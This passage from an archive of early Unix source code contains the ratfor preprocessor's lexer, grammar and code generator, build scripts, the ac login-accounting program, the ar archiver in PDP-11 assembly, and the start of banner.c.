	peek = c;
	for(i=0; (fname[i]=c=getc())!='\n' && c!=';' && c!=' ' && c!='\t'; i++);
	fname[i] = '\0';
	if( (fd = copen(fname,'r')) < 0 ) {
		error("can't open %s", fname);
		cexit(1);
	}
	else {
		filestack[++ninclude] = fd;
		linect[ninclude] = 0;
	}
}

lookup(string,tbl) char *string; char *tbl[]; {
	register i,j, r;
	for(i=0; tbl[i]!=0; i++){ 
		for( j=0; (r=tbl[i][j])==string[j] && r!='\0'; j++);
		if( r == string[j] )
			return(i);
	}
	return( -1 );
}

char	str[200];
int	strp;
int	nstr;

yylex(){
	int c, type;
  top:
	while( (c=getc())==' ' || c=='\n' || c=='\t' );
	yylval = c;
	switch(c){

	case '\0':
		return('\0');
	case ';':
		return(SCOL);
	case'{':
		return(LCURL);
	case '}':
		return(RCURL);
	}
	peek = c;
	nstr = getstr(str);
	yylval = &str[0];
	if( alldigits(str) )
		return(DIGITS);
	type = lookup(str,keyword);
	if( keytran[type]==XDEFINE ) {
		defstat();
		goto top;
	} else if( keytran[type]==XINCLUDE ) {
		inclstat();
		goto top;
	} else if( type > 1 )
		return(keytran[type]);
	else if( type < 0 )
		return(XGOK);
	while( (c=getc())==' ' || c=='\t' || c=='\n' );
	peek = c;
	if( c>='a' && c<='z' || c>='A' && c<='Z' )
		return(NEWDO);
	else
		return(OLDDO);
}

getstr(s) char *s; {
	int  c, sp;
	for (sp=0; (c=s[sp++]=getc())!=' ' && c!='\t' && c!='\n' && c!='{' && c!='}'
		&& c!=';' && c!='(' && c!=')' ; )
			if( c=='\'' || c=='"' )
				while( (s[sp++]=getc())!=c );
	peek = c;
	s[--sp]='\0';
	return(sp);
}

alldigits(s) char *s; {
	int c;
	if( *s == '\0' )
		return(0);
	while( (c = *s++) != '\0' )
		if( c<'0' || c>'9' )
			return(0);
	return(1);
}

int	dbg	0;

yyerror(){;}

alphanum(c) int c; {
	if(c>='0' && c<='9') return(1);
	if(c>='a' && c<='z') return(1);
	if(c>='A' && c<='Z') return(1);
	return(0);
}

#define	MAXNAMES	100

char	*names[MAXNAMES];
char	*nameptr[MAXNAMES];
int	nnames	0;

defstat(){
	int c,i,index;
	extern int peek,nstr;
	extern char str[];
	char *getvec();
	while( (c=getc())==' ' || c=='\t' );
	peek = c;
	for(nstr=0; c=getc(); nstr++ ){
		if(c==' ' || c=='\t' || c=='\n') break;
		str[nstr] = c;
	}
	peek = c;
	str[nstr] = '\0';
	if( (index=lookup(str,names)) >= 0 )
		nameptr[index] = 0;
	else if( (index = nnames++)>=MAXNAMES-1 ){
		error("too many defined names");
		cexit(1);
	}
	names[index] = getvec(nstr+1);
	for( i=0; names[index][i]=str[i]; i++ );
	while( (c=getc())==' ' || c=='\t' );
	peek = c;
	for( i=0; (c=getc())!='\n' && c!='\0'; i++ )
		str[i] = c;
	str[i] = '\0';
	nameptr[index] = getvec(i+1);
	for( i=0; nameptr[index][i]=str[i]; i++ );
}

-- /usr/source/rat/r.g mode=0100664 uid=3 gid=3 atime=174922315 mtime=169260227 --
%term	LCURL RCURL LPAR RPAR SCOL DIGITS
%term	XIF XELSE XFOR XWHILE XBREAK NEXT 
%term	OLDDO NEWDO
%term	XGOK XDEFINE XINCLUDE
%term	REPEAT UNTIL
%%

statl	: statl  stat
	|
	;
stat	: if stat	={ outcont($1); }
	| ifelse stat	={ outcont($1+1); }
	| while stat	={ whilestat($1); }
	| for stat	={ forstat($1); }
	| repeat stat UNTIL	={ untils($1); }
	| XBREAK	={ breakcode($1); }
	| NEXT		={ nextcode($1); }
	| newdo stat	={ dostat($1); }
	| OLDDO		={ docode(0,$1); }
	| XGOK		={ gokcode($1); }
	| SCOL
	| LCURL statl RCURL
	| label stat
	| error		={ errcode($1); yyclearin; }
	;
label	: DIGITS	={ outcode($1); outcode("\t"); }
	;
if	: XIF		={ ifcode($1); }
	;
ifelse	: if stat XELSE	={ outgoto($1+1); outcont($1); }
	;
while	: XWHILE	={ whilecode($1); }
	;
for	: XFOR		={ forcode($1); }
	;
repeat	: REPEAT	={ repcode($1); }
	;
newdo	: NEWDO		={ docode(1,$1); }
	;
%%
-- /usr/source/rat/r.h mode=0100664 uid=3 gid=3 atime=174922337 mtime=169260227 --
#
extern	int	contfld;
extern	int	dbg;
extern	int	yyval;
extern	int	*yypv;
extern	int	yylval;
extern	int	peek;
extern	int	errorflag;
-- /usr/source/rat/r1.c mode=0110664 uid=3 gid=3 atime=174922317 mtime=169260227 --
#include "r.h"

char	scrat[500];

int	brkptr	-1;
int	brkstk[10];
int	forptr	0;
int	forstk[10];

repcode() {
	outcont(0);
	yyval = genlab();
	outcont(yyval);
	brkstk[++brkptr] = yyval+1;
	genlab();
	genlab();
}

untils(p1) int p1; {
	outnum(p1+1);
	outcode("\tif(.not.");
	balpar(scrat);
	outcode(scrat);
	outcode(")");
	outgoto(p1);
	outcont(p1+2);
	brkptr--;
}

ifcode(p1) int p1; {
	outcode("\tif(.not.");
	balpar(scrat);
	outcode(scrat);
	outcode(")");
	outgoto(yyval=genlab()); genlab();
}

whilecode(p1) int p1; {
	outcont(0);
	brkstk[++brkptr] = yyval = genlab(); genlab();
	outnum(yyval);
	outcode("\tif(.not.");
	balpar(scrat);
	outcode(scrat);
	outcode(")");
	outgoto(yyval+1);
}

whilestat(p1) int p1; {
	outgoto(p1);
	outcont(p1+1);
	brkptr--;
}

balpar(bp) char *bp; {
	int  i, c, lpar;
	extern int peek;
	while( (c=getc()) == ' ' || c == '\t' || c=='\n' );
	peek = c;
	if( c != '(' ){
		error("missing left paren");
		bp[0] = '\0';
		return(bp);
	}
	for( lpar=i=0; (bp[i++]=c=getc())!='\0'; ){
		if( c=='\'' || c=='"' )
			while( (bp[i++]=getc()) != c );
		if( i>=499 || c=='{' || c=='}' ){
			error("missing right parenthesis at %.20s", bp);
			break;
		}
		if( c=='(' )
			lpar++;
		else if( c==')' )
			lpar--;
		if( lpar == 0 )
			break;
	}
	bp[i] = '\0';
	return(bp);
}

int	labval	23000;

genlab(){
	return(++labval);
}

gokcode(p1) char *p1; {
	outcode("\t");
	outcode(p1);
	eatup(p1,scrat);
	outcode(scrat);
	outcode(0);
}

eatup(p1,bp) char *p1, *bp; {
	extern int peek;
	int i,c,lnb,lpar;
	lnb = '\n';
	while( c = *p1++ )
		if( c!=' ' )
			lnb = c;
	i = lpar = 0;
  more:
	for( ; (bp[i++]=c=getc())!=';' && c!='{' && c!='\n' && c!='}'; ){
		if( i>=499 ){
			error("statement too long at %.20s", bp);
			break;
		}
		if( c != ' ' && c != '\t' )
			lnb = c;
		if( c=='\'' || c=='"' )
			while( (bp[i++]=getc()) != c );
		if( c=='(' )
			lpar++;
		else if( c==')' ) {
			lpar--;
			if( lpar < 0 )
				error("missing left paren at %.20s",bp);
		}
	}
	if( c == '\n' ){
		if( lnb=='\n' || lnb=='+' || lnb=='-' || lnb=='*' || lnb=='('
			|| lnb=='/' || lnb==',' || lnb=='&'  || lnb=='|'
			|| lnb=='=' )
				goto more;
		c = ';';
	}
	if( c!=';' )
		peek = c;
	bp[i-1] = '\0';
	if( lpar > 0 )
		error("missing right paren at %.20s",bp);
	return(bp);
}

forcode(){
	extern int peek;
	int i,j,c;
	char *bp, *getvec();
	outcont(0);
	balpar(scrat);
	yyval = genlab(); genlab(); genlab();
	brkstk[++brkptr] = yyval+1;
	if( scrat[0] == '\0' ){
		forstk[forptr++] = bp = getvec(1);
		*bp = '\0';
		return;
	}
	scrat[0] = '\t';
	for( i=1; (c=scrat[i++])!=';' && c!='\0' ; )
		if( c=='\'' || c=='"' )
			while( scrat[i++] != c );
	scrat[i-1] = '\0';
	if( nonblank(scrat) ){
		outcode(scrat);
		outcode(0);
	}
	for( j=i; (c=scrat[i++])!=';' && c!='\0' ; )
		if( c=='\'' || c=='"' )
			while( scrat[i++] != c );
	scrat[i-1] = '\0';
	if( nonblank(&scrat[j]) ){
		outnum(yyval);
		outcode("\tif(.not.(");
		outcode(&scrat[j]);
		outcode("))");
		outgoto(yyval+2);
	}
	else
		outcont(yyval);
	for( j=0; scrat[i+1]!='\0'; )
		scrat[j++] = scrat[i++];
	scrat[j] = '\0';
	forstk[forptr++] = bp = getvec(j+1);
	for(i=0; *bp++ = scrat[i++]; );
}

forstat(p1) int p1; {
	char *bp, *q;
	int i;
	bp = forstk[--forptr];
	outnum(p1+1);
	if( nonblank(bp) ){
		outcode("\t");
		outcode(bp);
		outcode(0);
	}
	outgoto(p1);
	outcont(p1+2);
	for( q=bp; *q++; );
	relvec(bp, q-bp);
	brkptr--;
}

docode(new,p1) int new; char *p1; {
	outcode("\t");
	outcode(p1);
	eatup(p1,scrat);
	yyval = 0;
	if(new){
		yyval = genlab(); genlab();
		brkstk[++brkptr] = yyval;
		outnum(yyval);
	}
	outcode(scrat);
	outcode(0);
}

dostat(p1) int p1; {
	if( p1==0 )
		return;
	outcont(p1);
	outcont(p1+1);
	brkptr--;
}

breakcode(p1) int p1; {
	if(brkptr<0){
		error("illegal BREAK");
		return;
	}
	outgoto(brkstk[brkptr]+1);
}

nextcode(p1) int p1; {
	if(brkptr<0){
		error("illegal NEXT");
		return;
	}
	outgoto(brkstk[brkptr]);
}

nonblank(s) char *s; {
	int c;
	while( c = *s++ )
		if( c!=' ' && c!='\t' && c!='\n' )
			return(1);
	return(0);
}

error(s1, s2) char *s1, *s2; {
	extern int linect[],ninclude,infile;
	printf( 2, "error at line %d, file %d: ",linect[ninclude],infile);
	printf( 2, s1,s2);
	printf( 2, "\n");
	errorflag = 1;
}

errcode(p1) char *p1; {
	int c;
	extern int yychar;
	extern int linect[],ninclude,infile;
	printf( 2, "\nsyntax error, line %d, file %d\n", linect[ninclude],infile);
	while( (c=getc()) != ';' && c != '}' && c != '\n' && c != '\0' );
	yychar = -1;
	errorflag = 1;
}
-- /usr/source/rat/r2.c mode=0100664 uid=3 gid=3 atime=174922330 mtime=169260227 --
#include "r.h"

char	outbuf[80];
int	outp	0;
int	cont	0;

outcode(p) char *p; {
	int i,j,c,c1;
	char *q;
	if( p == 0 ){
		outbuf[outp] = '\0';
		printf("%s\n", outbuf);
		outp = cont = 0;
		return;
	}
	while( (c = *p++) ){
		c1 = *p;
		switch(c){

		case '"':
		case '\'':
			for( q=p; *q != c; q++ );
			outnum(q-p);
			ptc('h');
			while( p != q )
				ptc(*p++);
			p++;
			break;
		case '>':
			if( c1=='=' ){
				pts(".ge."); p++;
			} else
				pts(".gt.");
			break;
		case '<':
			if( c1=='=' ){
				pts(".le."); p++;
			} else if( c1=='>' ){
				pts(".ne."); p++;
			} else
				pts(".lt.");
			break;
		case '=':
			if( c1=='=' ){
				pts(".eq."); p++;
			} else
				ptc('=');
			break;
		case '!':
			if( c1=='=' ){
				pts(".ne."); p++;
			} else
				pts(".not.");
			break;
		case '&':
			if( c1=='&' )
				p++;
			pts(".and.");
			break;
		case '|':
			if( c1=='|' )
				p++;
			pts(".or.");
			break;
		case '\t':
			tabs();
			break;
		case '\n':
			ptc(' ');
			break;
		default:
			ptc(c);
			break;
		}
	}
}

ptc(c) char c; {
	if( outp > 71 )
		contcard();
	outbuf[outp++] = c;
}

pts(s) char *s; {
	while(*s)
		ptc(*s++);
}

int	contfld	0;

contcard(){
	outbuf[outp] = '\0';
	printf("%s\n", outbuf);
	for( outp=0; outp<contfld-1; outbuf[outp++] = ' ' );
	outbuf[outp++] = '&';
}

tabs(){
	ptc(' ');
	while( outp<7 )
		ptc(' ');
	while( outp%3 != 1)
		ptc(' ');
}

outnum(n) int n; {
	int a;
	if( a = n/10 )
		outnum(a);
	ptc(n%10 + '0');
}

outcont(n) int n; {
	if( n > 0 )
		outnum(n);
	outcode("\tcontinue");
	outcode(0);
}

outgoto(n) int n; {
	outcode("\tgoto ");
	outnum(n);
	outcode(0);
}
-- /usr/source/rat/run mode=0100664 uid=3 gid=3 atime=174922364 mtime=174917280 --
yacc r.g
cc -s -O r1.c r2.c lex.c -ly -lp
cmp a.out /usr/lib/ratfor
cp a.out /usr/lib/ratfor
rm *.o a.out y.tab.c
-- /usr/source/run mode=0100664 uid=3 gid=3 atime=174927096 mtime=169667400 --
chdir /usr/sys; pwd; time sh run

chdir /usr/source/as; pwd; time sh run
chdir /usr/source/c; pwd; time sh run
chdir /usr/source/cref; pwd; time sh run
chdir /usr/source/fort; pwd; time sh run
chdir /usr/source/iolib; pwd; time sh run
chdir /usr/source/m6; pwd; time sh run
chdir /usr/source/mdec; pwd; time sh run
chdir /usr/source/rat; pwd; time sh run
chdir /usr/source/s1; pwd; time sh run
chdir /usr/source/s2; pwd; time sh run
chdir /usr/source/s3; pwd; time sh run
chdir /usr/source/s4; pwd; time sh run
chdir /usr/source/s5; pwd; time sh run
chdir /usr/source/s7; pwd; time sh run
chdir /usr/source/salloc; pwd; time sh run
chdir /usr/source/sno; pwd; time sh run
chdir /usr/source/tmg; pwd; time sh run
chdir /usr/source/yacc; pwd; time sh run
-- /usr/source/s1 mode=0140775 uid=3 gid=3 atime=174930091 mtime=174929608 --
-- /usr/source/s1/ac.c mode=0110664 uid=3 gid=3 atime=174922367 mtime=169260569 --
#
/*
 * acct [ -w wtmp ] [ -d ] [ -p people ]
 */

#define	TSIZE	30
#define	USIZE	200

struct {
	char	name[8];
	char	tty;
	char	fill1;
	float	time;
	int	fill2;
} ibuf;

struct ubuf {
	char	name[8];
	float	utime;
} ubuf[USIZE];

struct tbuf {
	struct	ubuf	*userp;
	float	ttime;
} tbuf[TSIZE];

char	*wtmp;
int	pflag, byday;
double	dtime;
double	midnight;
double	lastime;
double	day	1440.;
int	pcount;
char	**pptr;

int	montab[] { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31,
		31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };

char	*monasc[] {
	"Jan",
	"Feb",
	"Mar",
	"Apr",
	"May",
	"Jun",
	"Jul",
	"Aug",
	"Sep",
	"Oct",
	"Nov",
	"Dec"
};

main(argc, argv) 
char **argv;
{
	int c, fl;
	register i;
	register char *ip;
	extern fin;
	int f;

	wtmp = "/usr/adm/wtmp";
	while (--argc > 0 && **++argv == '-')
	switch(*++*argv) {
	case 'd':
		byday++;
		continue;

	case 'w':
		if (--argc>0)
			wtmp = *++argv;
		continue;

	case 'p':
		pflag++;
		continue;
	}
	pcount = argc;
	pptr = argv;
	if (fopen(wtmp, &fin) < 0) {
		printf("No %s\n", wtmp);
		return;
	}
	for(;;) {
		ip = &ibuf;
		for (i=0; i<16; i++) {
			if ((c=getc(&fin)) < 0)
				goto brk;
			*ip++ = c;
		}
		fl = 0;
		for (i=0; i<8; i++) {
			c = ibuf.name[i];
			if ('0'<=c&&c<='9'||'a'<=c&&c<='z'||'A'<=c&&c<='Z') {
				if (fl)
					goto skip;
				continue;
			}
			if (c==' ' || c=='\0') {
				fl++;
				ibuf.name[i] = '\0';
			} else
				goto skip;
		}
		loop();
    skip:;
	}
    brk:
	ibuf.name[0] = '\0';
	ibuf.tty = '~';
	time(&ibuf.time);
	loop();
	print();
}

loop()
{
	double ltod();
	register i;
	register struct tbuf *tp;
	register struct ubuf *up;

	if (ibuf.fill1||ibuf.fill2)
		return;
	ibuf.time = ltod(&ibuf.time)/60.;
	if(ibuf.tty == '|') {
		dtime = ibuf.time;
		return;
	}
	if(ibuf.tty == '}') {
		if(dtime == 0.)
			return;
		for(tp = tbuf; tp < &tbuf[TSIZE]; tp++)
			tp->ttime =+ ibuf.time-dtime;
		dtime = 0.;
		return;
	}
	if (lastime>ibuf.time || lastime+(1.5*day)<ibuf.time)
		midnight = 0.0;
	if (midnight==0.0)
		newday();
	lastime = ibuf.time;
	if (byday && ibuf.time > midnight) {
		upall(1);
		print();
		newday();
		for (up=ubuf; up < &ubuf[USIZE]; up++)
			up->utime = 0.0;
	}
	if (ibuf.tty == '~') {
		ibuf.name[0] = '\0';
		upall(0);
		return;
	}
	if ((i = ibuf.tty) >= 'a')
		i =- 'a' - '9';
	i =- '0';
	if (i<0 || i>=TSIZE)
		i = TSIZE-1;
	tp = &tbuf[i];
	update(tp, 0);
}

print()
{
	int i;
	float ttime, t;

	ttime = 0.0;
	for (i=0; i<USIZE; i++) {
		if(!among(i))
			continue;
		t = ubuf[i].utime;
		if (t>0.0)
			ttime =+ t;
		if (pflag && ubuf[i].utime > 0.0) {
			printf("\t%-8.8s%6.2f\n",
			    ubuf[i].name, ubuf[i].utime/60.);
		}
	}
	if (ttime > 0.0) {
		pdate();
		printf("\ttotal%9.2f\n", ttime/60.);
	}
}

upall(f)
{
	register struct tbuf *tp;

	for (tp=tbuf; tp < &tbuf[TSIZE]; tp++)
		update(tp, f);
}

update(tp, f)
struct tbuf *tp;
{
	int i, j;
	struct ubuf *up;
	double t, t1;

	if (f)
		t = midnight;
	else
		t = ibuf.time;
	if (tp->userp) {
		t1 = t - tp->ttime;
		if (t1>0.0 && t1 < 1.5*day)
			tp->userp->utime =+ t1;
	}
	tp->ttime = t;
	if (f)
		return;
	if (ibuf.name[0]=='\0') {
		tp->userp = 0;
		return;
	}
	for (up=ubuf; up < &ubuf[USIZE]; up++) {
		if (up->name[0] == '\0')
			break;
		for (j=0; j<8 && up->name[j]==ibuf.name[j]; j++);
		if (j>=8)
			break;
	}
	for (j=0; j<8; j++)
		up->name[j] = ibuf.name[j];
	tp->userp = up;
}

among(i)
{
	register j, k;
	register char *p;

	if (pcount==0)
		return(1);
	for (j=0; j<pcount; j++) {
		p = pptr[j];
		for (k=0; k<8; k++) {
			if (*p == ubuf[i].name[k]) {
				if (*p++ == '\0')
					return(1);
			} else
				break;
		}
	}
	return(0);
}

newday()
{
	if(midnight == 0.)
		midnight = 240.;
	while (midnight <= ibuf.time)
		midnight =+ day;
}

pdate()
{
	register days, mons, yrs;
	double year, tim;

	if (byday==0)
		return;
	yrs = 2;
	tim = 0.0;
	for(;;) {
		year = 365. * day;
		if(yrs%4 == 0)
			year =+ day;
		if(tim+year > midnight)
			break;
		yrs++;
		tim =+ year;
	}
	days = (midnight-tim-720.)/day;
	montab[1] = 28;
	if(yrs%4 == 0)
		montab[1]++;
	for (mons=0; montab[mons]<=days; mons++)
		days =- montab[mons];
	mons =% 12;
	printf("%s %2d", monasc[mons], days+1);
}
-- /usr/source/s1/ar.s mode=0110664 uid=3 gid=3 atime=174922385 mtime=169260569 --
/ ar -- archive/library

	mov	(sp)+,r0
	sub	$2,r0
	ble	userr
	tst	(sp)+
	mov	(sp)+,r1
	clr	r2
1:
	tstb	(r1)
	beq	1f
	cmpb	(r1),$'v
	bne	2f
	inc	r1
	incb	vflg
	br	1b
2:
	tst	r2
	bne	userr
	movb	(r1)+,r2
	br	1b
1:
	tst	r2
	beq	userr
	mov	$arglst,r1
1:
	mov	(sp)+,(r1)+
	dec	r0
	bgt	1b
	clr	(r1)+
	mov	$swlst,r1
1:
	cmp	r2,(r1)+
	beq	1f
	tst	(r1)+
	bne	1b
	br	userr
1:
	jmp	*(r1)

swlst:
	'r; comr
	'u; comu
	'd; comd
	'x; comx
	't; comt
	 0; 0

userr:
	jsr	r5,diag
		<bad usage\n\0>
	.even

putc:
	movb	r0,ch
	mov	$1,r0
	sys	write; ch; 1
	rts	r5

print:
	movb	(r1)+,r0
	beq	1f
	jsr	r5,putc
	br	print
1:
	rts	r5

diag:
	mov	r5,r1
	jsr	r5,print
	tst	tfo
	beq	1f
	sys	unlink; tfil
1:
	sys	exit

getaf:
	mov	arglst,0f
	sys	open; 0:..; 0
	bes	1f
	mov	r0,afi
	sys	read; buf; 2
	cmp	buf,magic
	bne	magerr
	tst	(r5)+
1:
	rts	r5

magerr:
	mov	arglst,r1
	jsr	r5,print
	jsr	r5,diag
		< -- not in archive format\n\0>
	.even

mktmp:
	sys	stat; tfil; buf
	bes	1f
	incb	tfil+8
	cmpb	tfil+8,$'z
	blo	mktmp
	br	tferr
1:
	sys	signal; 2; 1
	ror	r0
	bcs	1f
	sys	signal; 2; done
1:
	sys	creat; tfil; 600
	bes	tferr
	mov	r0,tfo
	sys	open; tfil; 0
	bes	tferr
	mov	r0,tfi
	rts	r5

tferr:
	jsr	r5,diag
		<cannot open temp file\n\0>
	.even

getdir:
	mov	afi,r0
	sys	read; dir; 16.
	cmp	r0,$16.
	bne	1f
	jsr	r5,mvname
	tst	(r5)+
1:
	rts	r5

mvname:
	mov	name,rname
	mov	name+2,rname+2
	mov	name+4,rname+4
	mov	name+6,rname+6
	rts	r5

skip:
	mov	size,r0
	inc	r0
	bic	$1,r0
	mov	r0,0f
	mov	afi,r0
	sys	seek; 0:..; 1
	rts	r5

trim:
	mov	r0,r2
1:
	tstb	(r0)
	beq	1f
	cmpb	(r0)+,$'/
	beq	trim
	br	1b
1:
	rts	r5

match:
	mov	$arglst+2,r1
1:
	mov	(r1)+,r0
	beq	1f
	cmp	r0,$-1
	beq	1b
	jsr	r5,trim
	mov	$name,r0
2:
	cmp	r0,$name+8.
	beq	2f
	cmpb	(r0),(r2)+
	bne	1b
	tstb	(r0)+
	bne	2b
2:
	cmp	(r5)+,-(r1)
1:
	rts	r5

mvfil:
	mov	(r1),9f
	mov	(r1),0f
	sys	stat; 0:..; buf
	bes	operr
	sys	open; 9:..; 0
	bes	operr
	mov	r0,fio
	mov	(r1),r0
	mov	$-1,(r1)
	jsr	r5,trim
	mov	$name,r0
1:
	cmp	r0,$name+8.
	beq	1f
	movb	(r2)+,(r0)+
	bne	1b
1:
	mov	buf+32.,mtim
	mov	buf+34.,mtim+2
	movb	buf+7.,ouid
	movb	buf+4.,mode
	mov	buf+10.,size
	mov	tfo,r0
	sys	write; dir; 16.
	mov	size,r2
1:
	mov	fio,r0
	sys	read; buf; 512.
	sub	r0,r2
	mov	r0,0f
	beq	1f
	mov	tfo,r0
	sys	write; buf; 0:..
	br	1b
1:
	tst	r2
	bne	phserr
	bit	$1,size
	beq	1f
	mov	tfo,r0
	sys	seek; 1; 1
1:
	mov	fio,r0
	sys	close
	jsr	r5,mvname
	rts	r5

operr:
	mov	9b,r1
	jsr	r5,print
	jsr	r5,diag
		< -- cannot open\n\0>
	.even

phserr:
	mov	9b,r1
	jsr	r5,print
	jsr	r5,diag
		< -- phase error\n\0>
	.even

copyfl:
	mov	tfo,r0
	sys	write; dir; 16.
	mov	size,r1
	mov	$rname,9b
1:
	mov	r1,0f
	beq	1f
	cmp	r1,$512.
	blo	2f
	mov	$512.,0f
2:
	mov	afi,r0
	sys	read; buf; 0:..
	sub	r0,r1
	mov	r0,0f
	beq	phserr
	mov	tfo,r0
	sys	write; buf; 0:..
	br	1b
1:
	bit	$1,size
	beq	1f
	mov	afi,r0
	sys	seek; 1; 1
	mov	tfo,r0
	sys	seek; 1; 1
1:
	rts	r5

xtract:
/	movb	mode,0f
	sys	creat; rname; 0:666
	bes	noxerr
	mov	r0,fio
	mov	size,r1
	mov	$rname,9b
1:
	mov	r1,0f
	beq	1f
	cmp	r1,$512.
	blo	2f
	mov	$512.,0f
2:
	mov	afi,r0
	sys	read; buf; 0:..
	sub	r0,r1
	mov	r0,0f
	beq	phserr
	mov	fio,r0
	sys	write; buf; 0:..
	br	1b
1:
	mov	fio,r0
	sys	close
	bit	$1,size
	beq	1f
	mov	afi,r0
	sys	seek; 1; 1
1:
	mov	r0,-(sp)
	mov	r1,-(sp)
	mov	mtim+2,r1
	mov	mtim,r0
/	sys	mdate
	mov	(sp)+,r1
	mov	(sp)+,r1
	rts	r5

noxerr:
	mov	$rname,r1
	jsr	r5,print
	jsr	r5,diag
		< -- cannot create\n\0>
	.even

table:
	mov	$rname,r1
	jsr	r5,print
	mov	$'\n,r0
	jsr	r5,putc
	rts	r5

mesg:
	mov	r1,-(sp)
	mov	(r5)+,r0
	tstb	vflg
	beq	1f
	jsr	r5,putc
	mov	$' ,r0
	jsr	r5,putc
	mov	$rname,r1
	jsr	r5,print
	mov	$'\n,r0
	jsr	r5,putc
1:
	mov	(sp)+,r1
	rts	r5

oldnew:
	sys	stat; rname; buf
	bes	1f
	cmp	buf+32.,mtim
	blo	1f
	bhi	2f
	cmp	buf+34.,mtim+2
	blos	1f
2:
	tst	(r5)+
	mov	$rname,tname
	mov	$tname,r1
1:
	rts	r5

comr:
	jsr	r5,mktmp
	jsr	r5,getaf
		br copfl
1:
	jsr	r5,getdir
		br copfl
	jsr	r5,match
		br 2f
	jsr	r5,mesg; 'r
	jsr	r5,skip
	jsr	r5,mvfil
	br	1b
2:
	jsr	r5,copyfl
	jsr	r5,mesg; 'c
	br	1b

comu:
	jsr	r5,mktmp
	jsr	r5,getaf
		br noaf
1:
	jsr	r5,getdir
		br copfl
	tst	arglst+2
	beq	2f
	jsr	r5,match
		br 3f
	mov	$-1,(r1)
2:
	jsr	r5,oldnew
		br 3f
	jsr	r5,mesg; 'r
	jsr	r5,skip
	jsr	r5,mvfil
	br	1b
3:
	jsr	r5,copyfl
	jsr	r5,mesg; 'c
	br	1b

comd:
	jsr	r5,mktmp
	jsr	r5,getaf
		br noaf
1:
	jsr	r5,getdir
		br 1f
	jsr	r5,match
		br 2f
	mov	$-1,(r1)
	jsr	r5,skip
	jsr	r5,mesg; 'd
	br	1b
2:
	jsr	r5,copyfl
	jsr	r5,mesg; 'c
	br	1b
1:
	jsr	r5,nfound
	br	copfl

noaf:
	jsr	r5,diag
		<no archive file\n\0>
	.even

crterr:
	jsr	r5,diag
		<cannot create archive file\n\0>
	.even

copfl:
	mov	$arglst,r1
	mov	(r1)+,0f
1:
	tst	(r1)+
	beq	1f
	cmp	-2(r1),$-1
	beq	1b
	tst	-(r1)
	jsr	r5,mvfil
	jsr	r5,mesg; 'a
	br	1b
1:
	sys	signal; 2; 1 / no interrupts during copy back
	sys	creat; 0:..; 666
	bes	crterr
	mov	r0,afo
	sys	write; magic; 2
1:
	mov	tfi,r0
	sys	read; buf; 512.
	mov	r0,0f
	beq	done
	mov	afo,r0
	sys	write; buf; 0:..
	br	1b

done:
	jsr	r5,diag
		<\0>
	.even

comx:
	jsr	r5,getaf
		br noaf
1:
	jsr	r5,getdir
		br 1f
	tst	arglst+2
	beq	3f
	jsr	r5,match
		br 2f
	mov	$-1,(r1)
3:
	jsr	r5,xtract
	jsr	r5,mesg; 'x
	br	1b
2:
	jsr	r5,skip
	br	1b
1:
	jsr	r5,nfound
	br	done

comt:
	jsr	r5,getaf
		br noaf
1:
	jsr	r5,getdir
		br 1f
	tst	arglst+2
	beq	2f
	jsr	r5,match
		br 3f
	mov	$-1,(r1)
2:
	jsr	r5,table
3:
	jsr	r5,skip
	br	1b
1:
	jsr	r5,nfound
	br	done

nfound:
	mov	$arglst+2,r2
1:
	mov	(r2)+,r1
	beq	1f
	cmp	r1,$-1
	beq	1b
	mov	$-1,-(r2)
	jsr	r5,print
	mov	$notfnd,r1
	jsr	r5,print
	br	1b
1:
	rts	r5

notfnd:
	< -- not found\n\0>
	.even

tfil:	</tmp/vtma\0>
	.even
magic:	-147.

	.bss

afi:	.=.+2
afo:	.=.+2
tfi:	.=.+2
tfo:	.=.+2
fio:	.=.+2
rname:	.=.+9.
ch:	.=.+1
vflg:	.=.+1
	.even
tname:	.=.+2
dir:
	name: .=.+8.
	mtim: .=.+4
	ouid: .=.+1
	mode: .=.+1
	size: .=.+2
arglst:	.=.+200.
buf:	.=.+512.

-- /usr/source/s1/banner.c mode=0100664 uid=3 gid=3 atime=174922390 mtime=169273084 --
#define nchars 64	/*number of chars in char set*/
#define nlines  6	/*number of lines in a banner character*/
#define pposs  85	/*number of print positions on a line (must be multiple of 4)*/
			/*followed by end of string character*/
#define pospch 8	/*number of char positions per banner char*/
#define chpln  10	/*number of banner characters per line*/

struct bann{
	  char alpha[nlines][pposs];
};
struct bann buffer,*bp buffer;
char ctbl[nchars][nlines]{
	036,041,046,051,046,035,	/*@*/
	014,022,041,077,041,041,	/*A*/
	076,041,076,041,041,076,	/*B*/
	036,041,040,040,041,036,	/*C*/
	076,041,041,041,041,076,	/*D*/
	077,040,076,040,040,077,	/*E*/
	077,040,076,040,040,040,	/*F*/
	036,041,040,047,041,036,	/*G*/
	041,041,077,041,041,041,	/*H*/
	004,004,004,004,004,004,	/*I*/
	001,001,001,001,041,036,	/*J*/
	041,042,074,044,042,041,	/*K*/
	040,040,040,040,040,077,	/*L*/
	041,063,055,041,041,041,	/*M*/
	041,061,051,045,043,041,	/*N*/
	036,041,041,041,041,036,	/*O*/
	076,041,041,076,040,040,	/*P*/
	036,041,041,045,042,035,	/*Q*/
	076,041,041,076,042,041,	/*R*/
	036,040,036,001,041,036,	/*S*/
	037,004,004,004,004,004,	/*T*/
	041,041,041,041,041,036,	/*U*/
	041,041,041,041,022,014,	/*V*/
	041,041,041,055,063,041,	/*W*/
	041,022,014,014,022,041,	/*X*/
	021,012,004,004,004,004,	/*Y*/
	077,002,004,010,020,077,	/*Z*/
	016,010,010,010,010,016,	/*[*/
	040,020,010,004,002,001,	/*\*/
	034,004,004,004,004,034,	/*]*/
	004,012,000,000,000,000,	/*^*/
	000,000,000,000,000,077,	/*_*/
	000,000,000,000,000,000,	/* */
	010,010,010,010,000,010,	/*!*/
	022,022,000,000,000,000,	/*"*/
	022,077,022,022,077,022,	/*#*/
	036,054,036,015,055,036,	/*$*/
	001,062,064,013,023,040,	/*%*/
	014,022,014,024,042,035,	/*&*/
	010,010,000,000,000,000,	/*'*/
	004,010,010,010,010,004,	/*(*/
	010,004,004,004,004,010,	/*)*/
	000,022,014,014,022,000	/***/
};
char blank ' ';
char plot 'X';
int msk 040;	/*mask at sixth bit*/

main(argc,argp)
char **argp;int argc;
{
	int i;

	/*if invoked with no arguments, prints error comment;
	  if invoked with an argument, prints it in banner form.
	*/

	if(argc<2){
	  printf("missing argument\n");
	  exit();
	}
	banner(argp[1],bp);
	banprt(bp);
}

